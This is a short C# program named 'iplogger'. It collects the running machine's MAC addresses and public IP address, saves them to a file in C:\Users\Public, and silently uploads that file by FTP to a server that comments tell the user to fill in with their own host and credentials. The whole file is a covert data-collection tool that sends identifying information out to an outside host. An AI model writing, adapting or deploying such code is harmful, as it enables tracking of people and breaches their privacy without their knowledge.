using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;

namespace iplogger
{
    class Ip
    {
        public static void Main(string[] args)
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                var mac = string.Join(":", nic.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2"))); //gets mac address and writes it into a string
                string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
                using (StreamWriter writetext = new StreamWriter("C:\\Users\\Public\\ip.txt")) //saves into C:\Users\Public\ the txt file
                {
                    writetext.WriteLine(publicip);
                    writetext.WriteLine(mac);
                }
                WebClient client = new WebClient();
                client.Credentials = new NetworkCredential("user", "password"); //change "user" with the username of the ftp and "password" with your ftp password
                client.UploadFile("ftp://example:22", @"C:\Users\Public\ip.txt"); //change example with the ip or hostname of your server
            }
        }
    }
}
